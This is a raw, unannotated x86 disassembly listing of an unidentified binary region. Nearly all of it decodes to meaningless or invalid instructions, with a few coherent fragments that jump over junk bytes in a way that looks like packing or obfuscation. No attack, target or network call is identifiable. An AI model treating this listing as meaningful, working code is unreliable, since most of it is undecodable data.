  40ddc9:	call   0xace41f72
  40ddce:	cmp    DWORD PTR [ebp+0x3e0cc59a],edi
  40ddd4:	xor    al,0x10
  40ddd6:	aaa    
  40ddd7:	inc    esp
  40ddd8:	xchg   ebx,eax
  40ddd9:	mov    al,0xd4
  40dddb:	hlt    
  40dddc:	xor    DWORD PTR [ebp-0x2],0x1d
  40dde0:	fmul   QWORD PTR [edx+0x74]
  40dde3:	repnz aaa 
  40dde5:	fstp   QWORD PTR [eax-0x60610fa3]
  40ddeb:	mov    ch,0x88
  40dded:	mov    al,0x61
  40ddef:	shr    BYTE PTR [esi-0x7dc062bc],cl
  40ddf5:	inc    ebx
  40ddf6:	push   esi
  40ddf7:	jne    0x40de62
  40ddf9:	mov    esi,0x3cf6b377
  40ddfe:	mov    cl,0x66
  40de00:	push   ds
  40de01:	adc    ecx,DWORD PTR [edi-0x15]
  40de04:	jmp    0x49a9b736
  40de09:	nop
  40de0a:	inc    edi
  40de0b:	fild   WORD PTR [esi+0x3c]
  40de0e:	scas   al,BYTE PTR es:[edi]
  40de0f:	ret    0x444c
  40de12:	sar    BYTE PTR [eax],0xa9
  40de15:	sbb    DWORD PTR [ecx],0x4bb87849
  40de1b:	mov    ch,0x42
  40de1d:	call   0x1a925428
  40de22:	retf   
  40de23:	(bad)  
  40de24:	fistp  DWORD PTR [ecx+0x43]
  40de27:	lods   al,BYTE PTR ds:[esi]
  40de28:	adc    al,0xc8
  40de2a:	cld    
  40de2b:	mov    al,0xb5
  40de2d:	popf   
  40de2e:	ficomp DWORD PTR [edx-0x47946325]
  40de34:	cmp    al,0x47
  40de36:	push   esi
  40de37:	xchg   esi,eax
  40de38:	loop   0x40ddda
  40de3a:	cdq    
  40de3b:	repz xchg edx,eax
  40de3d:	jno    0x40dddf
  40de3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de40:	mov    ecx,0xf8e91d4e
  40de45:	sub    bh,BYTE PTR [edi-0x6fe9bdcd]
  40de4b:	cmp    BYTE PTR [edx+ebp*4],bl
  40de4e:	sub    ecx,edi
  40de50:	xlat   BYTE PTR ds:[ebx]
  40de51:	xchg   esp,eax
  40de52:	mov    ebx,0xfb13e7ce
  40de57:	ja     0x40ddda
  40de59:	daa    
  40de5a:	xor    ecx,edx
  40de5c:	inc    ebx
  40de5d:	repz sar WORD PTR [edx+0x31740ccd],1
  40de65:	dec    edx
  40de66:	sbb    bl,BYTE PTR [eax-0x38]
  40de69:	pop    eax
  40de6a:	dec    edi
  40de6b:	push   0x253da42e
  40de70:	scas   al,BYTE PTR es:[edi]
  40de71:	xchg   ebx,eax
  40de72:	add    DWORD PTR [edi-0x51],ebx
  40de75:	retf   0x3a75
  40de78:	cmp    eax,0x7e10909d
  40de7d:	test   BYTE PTR [ebx-0x7b],cl
  40de80:	sti    
  40de81:	adc    al,0x87
  40de83:	(bad)  
  40de84:	jmp    0xc92a2e91
  40de89:	adc    ebx,DWORD PTR [ebp+edi*1-0x4930d308]
  40de90:	aaa    
  40de91:	bound  eax,QWORD PTR [ebx+0x1a]
  40de94:	sub    ecx,DWORD PTR [esi+0x163db1d8]
  40de9a:	pop    esp
  40de9b:	sub    ah,ah
  40de9d:	pop    ebp
  40de9e:	data16 scas al,BYTE PTR es:[edi]
  40dea0:	in     eax,dx
  40dea1:	jbe    0x40de87
  40dea3:	push   cs
  40dea4:	dec    edx
  40dea5:	and    DWORD PTR [edi-0x19],ebx
  40dea8:	(bad)  
  40dea9:	frstor [eax+0x5e2c505f]
  40deaf:	push   ebp
  40deb0:	jmp    DWORD PTR ds:0x4f1b27b0
  40deb6:	inc    edi
  40deb7:	cmp    bh,BYTE PTR [edx+ecx*1]
  40deba:	aas    
  40debb:	sti    
  40debc:	loope  0x40df14
  40debe:	add    ebp,DWORD PTR [eax]
  40dec0:	add    BYTE PTR [edx-0x3b],bh
  40dec3:	dec    ecx
  40dec4:	test   al,0xb6
  40dec6:	jmp    0x3c2:0x288fd037
  40decd:	sbb    eax,0x103f64d1
  40ded2:	daa    
  40ded3:	fs mov ah,0x96
  40ded6:	outs   dx,BYTE PTR ds:[esi]
  40ded7:	xchg   ebx,eax
  40ded8:	dec    eax
  40ded9:	out    dx,eax
  40deda:	sbb    BYTE PTR [ecx+edx*8-0x27fdb3e9],ch
  40dee1:	test   al,0x81
  40dee3:	adc    DWORD PTR [esi-0x23c9104],ebp
  40dee9:	out    dx,eax
  40deea:	and    DWORD PTR [ecx+0x7a],ebx
  40deed:	lds    ebp,FWORD PTR [esi-0x16]
  40def0:	dec    ecx
  40def1:	dec    edi
  40def2:	sub    al,0x49
  40def4:	pop    es
  40def5:	and    ecx,DWORD PTR [ecx-0x54875eca]
  40defb:	lock cmp eax,0x24f601cb
  40df01:	cmp    bl,0xff
  40df04:	pop    ebx
  40df05:	arpl   WORD PTR [ebx],sp
  40df07:	pop    edi
  40df08:	add    dh,BYTE PTR [esp+ebx*1+0x7d2f3de3]
  40df0f:	ds inc eax
  40df11:	das    
  40df12:	adc    esp,DWORD PTR [edi-0x46]
  40df15:	repnz mov edi,0xb1b00125
  40df1b:	dec    ebp
  40df1c:	push   cs
  40df1d:	jmp    0x517288e3
  40df22:	in     al,dx
  40df23:	neg    al
  40df25:	add    esp,ecx
  40df27:	fistp  DWORD PTR [edx-0x5c]
  40df2a:	test   al,0xc1
  40df2c:	out    0x69,eax
  40df2e:	retf   
  40df2f:	aad    0xe2
  40df31:	out    0x3e,al
  40df33:	pop    edi
  40df34:	sub    esp,DWORD PTR [edx-0x47b10b83]
  40df3a:	repz xor al,0x25
  40df3d:	pop    esi
  40df3e:	aam    0xea
  40df40:	or     BYTE PTR [edx-0x7d],dl
  40df43:	jmp    0x41d1:0xc0dfde4a
  40df4a:	xor    edi,DWORD PTR [ebx]
  40df4c:	cmp    BYTE PTR [eax+0x15],0x1
  40df50:	test   BYTE PTR [edx],bh
  40df52:	add    al,cl
  40df54:	or     ch,cl
  40df56:	add    ebx,ecx
  40df58:	inc    ebp
  40df59:	test   BYTE PTR [edi-0x65aa79bc],bl
  40df5f:	dec    BYTE PTR [edx+0x65852525]
  40df65:	push   cs
  40df66:	test   eax,0xd1e3c25a
  40df6b:	icebp  
  40df6c:	push   esi
  40df6d:	les    ebp,FWORD PTR [edi+0x3]
  40df70:	mov    cs,edx
  40df72:	sub    al,0xfd
  40df74:	add    cl,0x5d
  40df77:	sbb    eax,0xca6e7b7d
  40df7c:	cmp    BYTE PTR [edx-0x55],bh
  40df7f:	pushf  
  40df80:	ror    ah,cl
  40df82:	test   al,0xb5
  40df84:	jbe    0x40df59
  40df86:	mov    ds:0xdb86c806,al
  40df8b:	mov    bh,0xc8
  40df8d:	or     eax,0xf2ff16af
  40df92:	jae    0x40dfcd
  40df94:	fsubp  st(3),st
  40df96:	scas   al,BYTE PTR es:[edi]
  40df97:	inc    ecx
  40df98:	dec    edx
  40df99:	xchg   edi,eax
  40df9a:	mov    bh,dh
  40df9c:	inc    esp
  40df9d:	(bad)  
  40df9e:	cmp    cl,BYTE PTR [ebx+0x2d]
  40dfa1:	fs mov bh,0xa9
  40dfa4:	je     0x40dfb3
  40dfa6:	(bad)  
  40dfa7:	repz cdq 
  40dfa9:	mov    edx,0x4589c303
  40dfae:	lods   al,BYTE PTR ds:[esi]
  40dfaf:	not    DWORD PTR ds:0x42a859
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x5940413a],1
  40dfde:	add    ebx,DWORD PTR [ebx]
  40dfe0:	pop    ebx
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	fimul  WORD PTR ds:0x973f9b9c
  40dfef:	dec    eax
  40dff0:	stc    
  40dff1:	ret    
  40dff2:	xlat   BYTE PTR ds:[ebx]
  40dff3:	xchg   esi,eax
  40dff4:	xchg   edx,eax
  40dff5:	(bad)  
  40dff6:	xlat   BYTE PTR ds:[ebx]
  40dff7:	adc    DWORD PTR [eax-0x44],edi
  40dffa:	fld    TBYTE PTR [esi-0x2c]
  40dffd:	outs   dx,BYTE PTR ds:[esi]
  40dffe:	mov    esi,0xb88b666d
  40e003:	rcl    ecx,cl
  40e005:	sub    al,0xce
  40e007:	loope  0x40dfea
  40e009:	cmp    esp,DWORD PTR [ecx+0x68]
  40e00c:	mov    BYTE PTR [edi-0x74a59ee8],dl
  40e012:	mov    ch,al
  40e014:	and    ecx,edi
  40e016:	pop    ss
  40e017:	adc    eax,DWORD PTR [esi]
  40e019:	dec    esp
  40e01a:	jmp    0x2958a79
  40e01f:	fild   QWORD PTR [edi-0x75]
  40e022:	push   edi
  40e023:	jno    0x40e00a
  40e025:	(bad)  
  40e026:	fnstcw WORD PTR [ebp+0x15]
  40e029:	js     0x40dfae
  40e02b:	fidiv  WORD PTR [ecx+0x48]
  40e02e:	add    al,0x9d
  40e030:	jp     0x40e05b
  40e032:	xor    al,BYTE PTR [edi+0x2e]
  40e035:	mov    ecx,0xff6e300d
  40e03a:	addr16 cmp esp,0xcadd5cf3
  40e041:	sub    dl,bh
  40e043:	adc    ecx,ebx
  40e045:	int    0xaf
  40e047:	arpl   WORD PTR [ebp+0x6],bp
  40e04a:	call   0xf80b9648
  40e04f:	fnstcw WORD PTR [ebp-0x7a0382c6]
  40e055:	cmp    BYTE PTR [ebx],dl
  40e057:	adc    BYTE PTR [ebx],dl
  40e059:	xor    BYTE PTR [edx-0x1b482010],ah
  40e05f:	sahf   
  40e060:	jle    0x40e0da
  40e062:	xchg   ebx,eax
  40e063:	inc    ebx
  40e064:	sub    ch,BYTE PTR [esi+edx*1-0x14]
  40e068:	dec    edx
  40e069:	add    dl,0x3b
  40e06c:	stc    
  40e06d:	fbstp  TBYTE PTR [edi]
  40e06f:	popa   
  40e070:	xchg   ecx,eax
  40e071:	ss mov cs,ebx
  40e074:	leave  
  40e075:	mov    WORD PTR [edi+0xc],fs
  40e078:	inc    edi
  40e079:	(bad)  
  40e07a:	xchg   ebx,eax
  40e07b:	xchg   edi,eax
  40e07c:	pop    ebp
  40e07d:	test   eax,0xf3cc71ad
  40e082:	sbb    eax,0x5ee67ad6
  40e087:	(bad)  
  40e088:	popf   
  40e089:	sbb    edi,esp
  40e08b:	daa    
  40e08c:	out    0x91,eax
  40e08e:	imul   ebp,DWORD PTR [ebp+0x5025a26a],0x56eed8cd
  40e098:	fcom   QWORD PTR [ecx-0x1b096cf1]
  40e09e:	mov    edx,0x1502dc96
  40e0a3:	jge    0x40e116
  40e0a5:	leave  
  40e0a6:	dec    esi
  40e0a7:	(bad)  
  40e0a8:	icebp  
  40e0a9:	push   cs
  40e0aa:	out    0x43,al
  40e0ac:	and    al,0x7f
  40e0ae:	cmc    
  40e0af:	imul   edx,DWORD PTR [ebp-0x71],0x2fd1359e
  40e0b6:	in     eax,dx
  40e0b7:	les    edi,FWORD PTR [edx]
  40e0b9:	enter  0x8122,0x23
  40e0bd:	dec    ebx
  40e0be:	mov    ah,0x67
  40e0c0:	ins    BYTE PTR es:[edi],dx
  40e0c1:	ins    BYTE PTR es:[edi],dx
  40e0c2:	iret   
  40e0c3:	cmp    eax,0xfdd9aa1a
  40e0c8:	sbb    DWORD PTR [edx-0x56],edx
  40e0cb:	fdivr  st(5),st
  40e0cd:	and    DWORD PTR [ecx+esi*8],edx
  40e0d0:	bound  ebx,QWORD PTR [esi]
  40e0d2:	pop    edi
  40e0d3:	mov    edx,es
  40e0d5:	xchg   ecx,eax
  40e0d6:	mov    dl,0x55
  40e0d8:	cmc    
  40e0d9:	jge    0x40e06d
  40e0db:	enter  0xdd93,0xdb
  40e0df:	aad    0x69
  40e0e1:	xchg   esp,eax
  40e0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e3:	sahf   
  40e0e4:	mov    DWORD PTR [eax],esi
  40e0e6:	out    0x3d,al
  40e0e8:	call   0x39d35fc7
  40e0ed:	cdq    
  40e0ee:	xchg   cl,dl
  40e0f0:	jo     0x40e16c
  40e0f2:	push   ss
  40e0f3:	lds    edi,FWORD PTR [ecx-0x68edfefd]
  40e0f9:	aad    0x76
  40e0fb:	cmp    dl,bl
  40e0fd:	pop    ebp
  40e0fe:	push   ebx
  40e0ff:	(bad)  
  40e100:	inc    esi
  40e101:	or     ah,BYTE PTR ds:0x4d370f46
  40e107:	rol    esp,0xe7
  40e10a:	and    dh,bh
  40e10c:	pop    ecx
  40e10d:	sbb    ecx,0x41b51f54
  40e113:	inc    ebx
  40e114:	(bad)  
  40e115:	and    ch,BYTE PTR [edi]
  40e117:	mov    es,ecx
  40e119:	loopne 0x40e0fa
  40e11b:	jno    0x40e16c
  40e11d:	push   ds
  40e11e:	leave  
  40e11f:	nop
  40e120:	imul   BYTE PTR [edx]
  40e122:	cwde   
  40e123:	sahf   
  40e124:	dec    ebp
  40e125:	cli    
  40e126:	jo     0x40e0e0
  40e128:	inc    edi
  40e129:	(bad)  
  40e12a:	jmp    0x40e0b3
  40e12c:	(bad)  
  40e12d:	hlt    
  40e12e:	lock test eax,0xedcf5abf
  40e134:	dec    edx
  40e135:	pop    edi
  40e136:	jb     0x40e1ab
  40e138:	jbe    0x40e101
  40e13a:	push   esi
  40e13b:	sub    esp,DWORD PTR [eax-0x3e]
  40e13e:	sbb    BYTE PTR [edx-0x426c16a5],0xaa
  40e145:	les    esp,FWORD PTR [edx]
  40e147:	add    DWORD PTR [eax-0x4b],edx
  40e14a:	bound  eax,QWORD PTR [ecx+0x4b]
  40e14d:	jbe    0x40e0e9
  40e14f:	sar    BYTE PTR [edi+0x46],cl
  40e152:	adc    al,0x83
  40e154:	loop   0x40e110
  40e156:	call   0xeacddff0
  40e15b:	psrld  mm1,QWORD PTR [ebp-0x91ceec6]
  40e162:	lock inc eax
  40e164:	inc    esp
  40e165:	push   ebp
  40e166:	dec    esi
  40e167:	add    BYTE PTR [edx],cl
  40e169:	jge    0x40e1e4
  40e16b:	das    
  40e16c:	loop   0x40e17f
  40e16e:	scas   eax,DWORD PTR es:[edi]
  40e16f:	in     al,0x1
  40e171:	xchg   BYTE PTR [edx+0x58],al
  40e174:	add    eax,0xa700a207
  40e179:	int    0x15
  40e17b:	jns    0x40e13f
  40e17d:	mov    dl,0x29
  40e17f:	xor    DWORD PTR [ecx+0x74],esp
  40e182:	js     0x40e147
  40e184:	add    BYTE PTR [eax],bl
  40e186:	or     bh,BYTE PTR [eax-0x7b]
  40e189:	adc    ebp,DWORD PTR ds:[esi]
  40e18c:	(bad)  
  40e18e:	lea    edi,[eax+0x77]
  40e191:	mov    esp,0xa12c6b13
  40e196:	sbb    al,0x19
  40e198:	dec    ecx
  40e199:	push   ds
  40e19a:	outs   dx,BYTE PTR cs:[esi]
  40e19c:	push   eax
  40e19d:	jnp    0x40e1d7
  40e19f:	dec    edi
  40e1a0:	jne    0x40e1ce
  40e1a2:	and    ebx,DWORD PTR ds:0x844d91aa
  40e1a8:	sub    bh,ch
  40e1aa:	enter  0xa949,0x11
  40e1ae:	push   ds
  40e1af:	je     0x40e199
  40e1b1:	pop    ss
  40e1b2:	cmp    eax,0x8262737e
  40e1b7:	mov    al,0x8c
  40e1b9:	cmp    edx,esi
  40e1bb:	int    0x97
  40e1bd:	pop    ecx
  40e1be:	call   0x2d6d:0xcced39d9
  40e1c5:	mov    esi,0x2ef5b737
  40e1ca:	or     ebp,DWORD PTR [edi-0x5b]
  40e1cd:	jns    0x40e228
  40e1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1d0:	jecxz  0x40e218
  40e1d2:	dec    ebp
  40e1d3:	jp     0x40e1e8
  40e1d5:	xor    eax,0x9d8aa88
  40e1da:	mov    bl,0x88
  40e1dc:	jge    0x40e1df
  40e1de:	inc    edi
  40e1df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1e0:	mov    esp,0x5dbc35af
  40e1e5:	adc    al,0xcd
  40e1e7:	add    al,0xcb
  40e1e9:	sbb    al,0x37
  40e1eb:	test   al,0xf8
  40e1ed:	adc    eax,0x51b25cba
  40e1f2:	mov    edi,0xcb22e7f4
  40e1f7:	sub    al,0x77
  40e1f9:	mov    dh,0x8f
  40e1fb:	mov    esi,DWORD PTR [esi+esi*1]
  40e1fe:	daa    
  40e1ff:	cmp    al,0xe8
  40e201:	mov    bl,0xce
  40e203:	jmp    0xbef67efe
  40e208:	push   ds
  40e209:	lods   al,BYTE PTR ds:[esi]
  40e20a:	fwait
  40e20b:	adc    al,bh
  40e20d:	fwait
  40e20e:	mov    bl,0xed
  40e210:	aas    
  40e211:	fmulp  st(2),st
  40e213:	adc    al,0x90
  40e215:	sbb    al,0xed
  40e217:	jle    0x40e19d
  40e219:	stos   BYTE PTR es:[edi],al
  40e21a:	inc    eax
  40e21b:	inc    esp
  40e21c:	xchg   ecx,eax
  40e21d:	cmp    DWORD PTR [edi+0x2d474a00],eax
  40e223:	dec    eax
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	cld    
  40e23b:	xchg   ebx,eax
  40e23c:	in     eax,dx
  40e23d:	test   DWORD PTR [ebp-0x50],0x7e357878
  40e244:	js     0x40e2be
  40e246:	sub    al,0xa9
  40e248:	xor    eax,0x96b1a87b
  40e24d:	xchg   BYTE PTR [eax-0xc7cf613],dh
  40e253:	add    eax,0xb836bcae
  40e258:	sub    al,0x6
  40e25a:	(bad)  
  40e25b:	ins    DWORD PTR es:[edi],dx
  40e25c:	dec    eax
  40e25d:	bound  ebp,QWORD PTR [ebx+0x4bee3502]
  40e263:	xor    cl,BYTE PTR [edi]
  40e265:	mov    ebx,0xa42d0d4
  40e26a:	mov    ebp,0x17ce134f
  40e26f:	sbb    ebp,edx
  40e271:	mov    esi,0xd2ef3f9
  40e276:	stos   BYTE PTR es:[edi],al
  40e277:	xor    al,BYTE PTR [edi+ecx*1-0x29fd0633]
  40e27e:	shr    DWORD PTR [esi-0x4f],0x5
  40e282:	(bad)  
  40e283:	jns    0x40e24e
  40e285:	mov    esp,0xeff3e7fb
  40e28a:	test   al,0x48
  40e28c:	shl    bh,cl
  40e28e:	dec    eax
  40e28f:	push   ecx
  40e290:	sbb    eax,0xd79c318c
  40e295:	mov    esi,0x67c204b4
  40e29a:	or     dl,BYTE PTR [eax-0x71]
  40e29d:	jb     0x40e25a
  40e29f:	cmp    al,0x5a
  40e2a1:	dec    edx
  40e2a2:	push   esp
  40e2a3:	add    eax,0x3535f1be
  40e2a8:	popf   
  40e2a9:	xor    bl,dl
  40e2ab:	push   ebx
  40e2ac:	dec    ebx
  40e2ad:	leave  
  40e2ae:	fld    DWORD PTR [edx-0x6c]
  40e2b1:	neg    bh
  40e2b3:	mov    al,0xa3
  40e2b5:	sub    BYTE PTR [edx-0x50965614],dl
  40e2bb:	rcl    DWORD PTR es:[ebx+0x51a7f03e],cl
  40e2c2:	(bad)  
  40e2c3:	das    
  40e2c4:	in     al,dx
  40e2c5:	ret    
  40e2c6:	pop    esi
  40e2c7:	loopne 0x40e2ba
  40e2c9:	jmp    0xf664463e
  40e2ce:	pop    es
  40e2cf:	jge    0x40e312
  40e2d1:	push   0xffffffdd
  40e2d3:	or     al,dl
  40e2d5:	icebp  
  40e2d6:	mov    ds:0xcd6c4086,eax
  40e2db:	mov    dl,0xfb
  40e2dd:	mul    DWORD PTR [esi+ebp*4+0x5d42316b]
  40e2e4:	mov    ch,0x16
  40e2e6:	push   cs
  40e2e7:	(bad)  
  40e2e8:	jl     0x40e335
  40e2ea:	repz leave 
  40e2ec:	sti    
  40e2ed:	addr16 js 0x40e33e
  40e2f0:	ret    
  40e2f1:	add    eax,DWORD PTR [esi-0x27]
  40e2f4:	add    BYTE PTR [ecx],bl
  40e2f6:	lods   eax,DWORD PTR ds:[esi]
  40e2f7:	inc    edx
  40e2f8:	imul   ebx,eax,0x5
  40e2fb:	jl     0x40e2f4
  40e2fd:	dec    ebp
  40e2fe:	dec    eax
  40e2ff:	pop    ebx
  40e300:	test   al,0xd3
  40e302:	xor    BYTE PTR [edx+edx*1-0x5a],dl
  40e306:	mov    es,WORD PTR [esi]
  40e308:	xor    bl,bl
  40e30a:	mov    cl,BYTE PTR [edx]
  40e30c:	cmp    BYTE PTR [esi-0x3a],bh
  40e30f:	inc    ecx
  40e310:	push   cs
  40e311:	push   0x7d0935cf
  40e316:	mov    al,ds:0xe9ce6540
  40e31b:	movlps xmm7,QWORD PTR [ebx]
  40e31e:	ret    0xba38
  40e321:	in     eax,dx
  40e322:	push   ebp
  40e323:	fisubr DWORD PTR [edx+0x5fc2a3cb]
  40e329:	clc    
  40e32a:	aaa    
  40e32b:	in     al,0xc5
  40e32d:	add    eax,0x1304709e
  40e332:	bound  edx,QWORD PTR [esi+0x10d5be70]
  40e338:	adc    eax,0x8d47f569
  40e33d:	jge    0x40e309
  40e33f:	adc    DWORD PTR [ecx+esi*8+0x7f],esi
  40e343:	dec    ebx
  40e344:	add    al,0xdb
  40e346:	(bad)  
  40e348:	sbb    ecx,esp
  40e34a:	stos   DWORD PTR es:[edi],eax
  40e34b:	dec    edi
  40e34c:	inc    edx
  40e34d:	and    BYTE PTR ss:[ecx-0x32],bl
  40e351:	enter  0x7b2d,0x28
  40e355:	sbb    ch,BYTE PTR [esp+ebp*2-0x451ac740]
  40e35c:	adc    DWORD PTR [eax-0x649b1910],ebx
  40e362:	bound  edx,QWORD PTR [edx+0x1cfb8bf4]
  40e368:	inc    ebp
  40e369:	push   ss
  40e36a:	mov    BYTE PTR [ecx+0x4778e4c],ch
  40e370:	and    al,0x5f
  40e372:	enter  0xfe45,0x26
  40e376:	push   eax
  40e377:	inc    esi
  40e378:	int3   
  40e379:	jne    0x40e39e
  40e37b:	xchg   BYTE PTR [edx-0xf],dl
  40e37e:	mov    esp,0x14107286
  40e383:	mov    al,ds:0x12b9aed7
  40e388:	pop    esp
  40e389:	adc    eax,0xd3a7c6e7
  40e38e:	add    DWORD PTR gs:[ebx],edx
  40e391:	jmp    0x488e:0x3396f5f7
  40e398:	lds    ebx,FWORD PTR [edx-0x48dea13a]
  40e39e:	sub    BYTE PTR [ecx-0x660fc7be],ah
  40e3a4:	iret   
  40e3a5:	adc    eax,0xf55e316
  40e3aa:	fnstcw WORD PTR [edx+0x20]
  40e3ad:	add    esi,DWORD PTR [ebp-0x7dba5309]
  40e3b3:	sub    eax,0x78da7a31
  40e3b8:	aaa    
  40e3b9:	xchg   BYTE PTR [ebp-0x4a9af6c8],cl
  40e3bf:	cmp    al,0x8
  40e3c1:	cmp    BYTE PTR [edi-0x2c],cl
  40e3c4:	shl    BYTE PTR [ebx-0x5bbf2bcd],0x13
  40e3cb:	std    
  40e3cc:	cmc    
  40e3cd:	andps  xmm3,XMMWORD PTR [edi+eax*8-0xbf216db]
  40e3d5:	add    edi,DWORD PTR [edi+0x5e]
  40e3d8:	jecxz  0x40e458
  40e3da:	inc    eax
  40e3db:	rcl    ah,cl
  40e3dd:	ficom  DWORD PTR [edi+0x131ce29]
  40e3e3:	mov    bl,0x42
  40e3e5:	pushf  
  40e3e6:	xchg   esi,eax
  40e3e7:	lods   eax,DWORD PTR ds:[esi]
  40e3e8:	inc    ebp
  40e3e9:	fstp   DWORD PTR [ebp+eax*2+0x2b]
  40e3ed:	fst    DWORD PTR [eax-0x3b]
  40e3f0:	repnz cdq 
  40e3f2:	pmulhuw mm2,QWORD PTR [bp+0x7226]
  40e3f8:	ins    BYTE PTR es:[di],dx
  40e3fa:	inc    esp
  40e3fb:	fist   DWORD PTR [ebx-0x43fe947b]
  40e401:	das    
  40e402:	das    
  40e403:	daa    
  40e404:	aaa    
  40e405:	bnd ret 
  40e407:	pop    ss
  40e408:	out    dx,eax
  40e409:	push   ecx
  40e40a:	or     ah,0xd7
  40e40d:	mov    ecx,0xb9765aa3
  40e412:	dec    esi
  40e413:	push   0x5e
  40e415:	call   FWORD PTR [ebp-0x51f3d864]
  40e41b:	sub    bl,BYTE PTR [edi]
  40e41d:	ret    0xc93c
  40e420:	outs   dx,BYTE PTR ds:[esi]
  40e421:	push   ebp
  40e422:	cmp    ch,ch
  40e424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e425:	das    
  40e426:	sub    cl,BYTE PTR [ebx]
  40e428:	lds    eax,FWORD PTR [ecx-0x375bcb57]
  40e42e:	mov    eax,ds:0x43639150
  40e433:	ficom  DWORD PTR [ecx-0x7a6ab569]
  40e439:	push   esp
  40e43a:	cmp    BYTE PTR [esp+esi*1],bh
  40e43d:	xchg   esp,eax
  40e43e:	cmp    DWORD PTR [ebp*1+0x2ae145e6],esp
  40e445:	push   eax
  40e446:	sub    BYTE PTR [esi+0x1],ah
  40e449:	xor    eax,0x6300104
  40e44e:	cdq    
  40e44f:	pop    esi
  40e450:	push   esp
  40e451:	pop    esp
  40e452:	(bad)  
  40e453:	push   edx
  40e454:	add    DWORD PTR [eax-0x79dcc23b],ebp
  40e45a:	sbb    esi,DWORD PTR [edi-0x7a]
  40e45d:	sbb    al,0x1d
  40e45f:	dec    ebx
  40e460:	js     0x40e49f
  40e462:	dec    ecx
  40e463:	or     ebx,DWORD PTR [eax+eiz*1]
  40e466:	stos   BYTE PTR es:[edi],al
  40e467:	mov    bh,bh
  40e469:	cmc    
  40e46a:	or     al,0x6e
  40e46c:	cld    
  40e46d:	adc    eax,DWORD PTR [eax+0x29]
  40e470:	and    bl,BYTE PTR [edi]
  40e472:	loope  0x40e4bf
  40e474:	std    
  40e475:	test   al,bl
  40e477:	ins    DWORD PTR es:[edi],dx
  40e478:	mov    al,0x67
  40e47a:	xchg   esp,eax
  40e47b:	cmp    esi,DWORD PTR [esp+edx*4-0x5ea96089]
  40e482:	push   es
  40e483:	jmp    0x40e4c6
  40e485:	add    BYTE PTR [eax+0x5c],ch
  40e488:	jmp    0x6e8:0x30ff0041
  40e48f:	lods   eax,DWORD PTR ds:[esi]
  40e490:	add    BYTE PTR [eax],al
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebx,DWORD PTR [eax+0x36]
  40e4b9:	ror    DWORD PTR [ebx+0x2],0xb5
  40e4bd:	js     0x40e537
  40e4bf:	xor    eax,0xc678787e
  40e4c4:	sbb    DWORD PTR [edx],ecx
  40e4c6:	fdiv   QWORD PTR [ebx-0x10c2080e]
  40e4cc:	mov    al,0x9a
  40e4ce:	ret    
  40e4cf:	or     al,0x38
  40e4d1:	jnp    0x40e530
  40e4d3:	into   
  40e4d4:	push   cs
  40e4d5:	div    BYTE PTR [ebp+0x33]
  40e4d8:	jb     0x40e47c
  40e4da:	and    dl,ah
  40e4dc:	jle    0x40e4f6
  40e4de:	cdq    
  40e4df:	ins    DWORD PTR es:[edi],dx
  40e4e0:	jmp    0xa605c13d
  40e4e5:	or     esp,DWORD PTR [esi+0x65]
  40e4e8:	mov    bh,0xc4
  40e4ea:	inc    esi
  40e4eb:	fwait
  40e4ec:	sub    DWORD PTR [ebp+edi*4+0xf486b90],esp
  40e4f3:	fistp  QWORD PTR [ecx]
  40e4f5:	push   ecx
  40e4f6:	push   0x1f
  40e4f8:	adc    dl,al
  40e4fa:	shl    BYTE PTR [esi+ebx*4-0x7672ee0a],1
  40e501:	pop    es
  40e502:	and    BYTE PTR [esi-0x55],cl
  40e505:	push   es
  40e506:	adc    dl,BYTE PTR [edi+0x7193b035]
  40e50c:	and    bl,BYTE PTR [eax+0x3ecc279b]
  40e512:	dec    esp
  40e513:	push   ds
  40e514:	imul   ebp,DWORD PTR [eax+0x2f2835ad],0x46aae4f2
  40e51e:	xchg   ebp,eax
  40e51f:	mov    eax,ds:0x70ee2624
  40e524:	sbb    ebx,DWORD PTR [edx]
  40e526:	popf   
  40e527:	stc    
  40e528:	int    0x23
  40e52a:	pop    edi
  40e52b:	xor    dh,bl
  40e52d:	bound  edx,QWORD PTR [eax-0x7262a3b6]
  40e533:	xor    ah,BYTE PTR [edx-0x7a9e64fb]
  40e539:	mov    BYTE PTR [eax+0x66],0xf0
  40e53d:	neg    BYTE PTR [edi]
  40e53f:	pop    esp
  40e540:	(bad)  
  40e541:	and    DWORD PTR [eax+0x5],0xffffffdf
  40e545:	mov    bl,0x4a
  40e547:	cmp    edx,DWORD PTR [edx-0x4a]
  40e54a:	imul   eax,ebp,0xfffffff8
  40e54d:	jns    0x40e51a
  40e54f:	sar    BYTE PTR [ebx*8-0x2437038f],0xe1
  40e557:	push   ss
  40e558:	pusha  
  40e559:	jl     0x40e511
  40e55b:	mov    ds:0xa70e0ac9,eax
  40e560:	jle    0x40e5cf
  40e562:	dec    ecx
  40e563:	lahf   
